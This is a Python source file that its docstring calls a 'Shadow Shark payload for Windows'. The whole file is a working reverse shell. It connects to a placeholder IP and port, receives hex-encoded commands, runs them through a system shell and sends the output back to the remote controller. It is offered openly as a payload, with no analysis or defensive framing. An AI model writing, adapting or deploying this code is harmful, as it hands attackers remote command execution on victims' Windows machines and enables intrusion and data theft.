# -*- coding: utf-8 -*-
"""
A full fledged Shadow Shark payload for Windows.

@author: Mr. Shark Spam Bot
"""
import socket
import subprocess
import os
import codecs
import json

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        new_text = text.encode()
        new_text = codecs.encode(new_text, encoding='hex')
        new_text = new_text.decode()
        new_text = json.dumps(new_text)
        new_text = new_text.encode()
    if decode is True:
        new_text = json.loads(text)
        new_text = new_text.encode()
        new_text = codecs.decode(new_text, encoding='hex')
        new_text = new_text.decode()
    return new_text

rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rev_socket.connect(('IP', PORT))

while True:
    command = b''
    while True:
        try:
            command = command + rev_socket.recv(1024)
            if not command:
                break
            if command[-1] == 34:
                break
        except ValueError:
            continue
    try:
        command = hex_handler(command, decode=True)
    except json.decoder.JSONDecodeError:
        continue

    if command == 'exit':
        rev_socket.close()
        break

    if command == 'directory':
        rev_socket.send(hex_handler(os.getcwd() + '>', encode=True))
        continue

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout = output.stdout.read().decode()
    except UnicodeDecodeError:
        rev_socket.send(hex_handler('Could not send the data.', encode=True))
        continue
    if stdout:
        rev_socket.send(hex_handler(stdout, encode=True))
        continue
    stderr = output.stderr.read().decode()
    if stderr:
        rev_socket.send(hex_handler(stderr, encode=True))
        continue

    if command.startswith('cd') and len(command.split()) >= 2:
        try:
            os.chdir(command[3:])
        except IOError:
            rev_socket.send(hex_handler('The system cannot find path specified.', encode=True))
            continue

    rev_socket.send(hex_handler('\n', encode=True))
